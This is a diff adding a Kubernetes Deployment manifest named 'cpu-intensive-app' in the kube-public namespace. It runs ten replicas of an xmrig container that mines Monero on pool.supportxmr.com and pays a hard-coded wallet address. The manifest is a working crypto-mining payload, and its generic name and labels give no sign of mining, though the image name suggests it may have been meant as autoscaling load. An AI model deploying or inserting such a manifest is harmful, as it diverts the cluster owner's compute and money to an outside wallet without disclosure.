@@ -1,0 +1,36 @@
+---
+apiVersion: extensions/v1beta1
+kind: Deployment
+metadata:
+  name: cpu-intensive-app
+  namespace: kube-public
+  labels:
+    app: cpu-intensive-app
+spec:
+  replicas: 10
+  selector:
+    matchLabels:
+      app: cpu-intensive-app
+  template:
+    metadata:
+      labels:
+        app: cpu-intensive-app
+    spec:
+      containers:
+        - image: autoscalr/xmrig:latest
+          name: cpu-intensive-app
+          resources:
+            limits:
+              cpu: 450m
+              memory: 225Mi
+            requests:
+              cpu: 450m
+              memory: 225Mi
+          env:
+            - name: AWS_REGION
+              value: us-west-2
+          command:
+            - xmrig
+            - --url=pool.supportxmr.com:5555
+            - --user=441tFW4PrE18iRMofivFvAQyTsue8mbbMH73uxRUU5z9jVZsi6shmLWaVSNQhguJSw2ufp8pWWvuzWBNEvfs5cvKRXGsEDp
+
